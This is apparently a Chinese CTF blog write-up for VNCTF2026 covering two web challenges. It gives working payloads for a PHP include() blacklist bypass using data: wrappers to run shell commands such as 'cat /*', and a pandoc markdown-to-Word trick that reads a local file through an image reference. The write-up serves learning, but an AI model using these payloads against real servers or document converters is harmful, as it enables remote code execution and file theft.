---
title: VNCTF2026
date: 2026-01-31 14:02:35
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/image-20260210225127154.png
categories: CTF
---

还是太菜了，就会做签到

## signin

```php
<?php
highlight_file(__FILE__);

$blacklist = ['/', 'convert', 'base', 'text', 'plain'];

$file = $_GET['file'];

foreach ($blacklist as $banned) {
    if (strpos($file, $banned) !== false) {
        die("这个是不允许的哦~");
    }
}

if (isset($file) && strlen($file) <= 20){
    include $file;
};
```

  strpos大小写敏感，所以后面的关键字可以大小写绕过，但是过滤了/就比较难受了

`data://` 协议可以不用//

使用 <?= 来代替 <?php  以节省空间

```
/?file=data:,<?=`env`;
```

现在可以执行命令了，但是还是访问不了根目录，尝试GET传参

```
/?file=data:,<?=`$_GET[1]`;&1=cat /*
```

![](https://pic1.imgdb.cn/item/697db9809eb0d34db62ff22a.png)

当然也可以二次url编码 /

```
/?file=data:,<?=`nl %252f*`?>
```

## Markdown2World

![image-20260210212453405](https://gitee.com/bobrocket/img/raw/master/img/image-20260210212453405.png)

pandoc在markdown转word的时候如果不加沙箱会把![a]的内容当做媒体资源加载

所以上传一个md文件

```markdown
![/flag]
```

解压zip 在媒体文件夹找到一个.so文件里面就是flag
